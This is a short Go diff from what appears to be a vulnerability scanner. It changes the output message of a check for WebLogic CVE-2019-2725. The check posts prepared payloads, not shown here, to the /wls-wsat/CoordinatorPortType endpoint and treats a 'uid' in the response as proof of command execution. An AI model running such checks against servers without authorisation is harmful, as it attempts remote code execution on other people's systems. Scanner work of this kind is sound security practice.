@@ -72,7 +72,7 @@ func CVE_2019_2725(url string) bool {
 	if req, err := pkg.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", weblogic_10_3_6post_str, false, header); err == nil {
 		if req2, err2 := pkg.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", weblogic_12_1_3post_str, false, header); err2 == nil {
 			if (req.StatusCode == 200 && strings.Contains(req.Body, "uid")) || (req2.StatusCode == 200 && strings.Contains(req2.Body, "uid")) {
-				fmt.Printf("weblogic-exp-sucess|CVE_2019_2725|%s\n", url)
+				fmt.Printf("[+] Found WebLogic CVE_2019_2725|%s\n", url)
 				return true
 			}
 		}
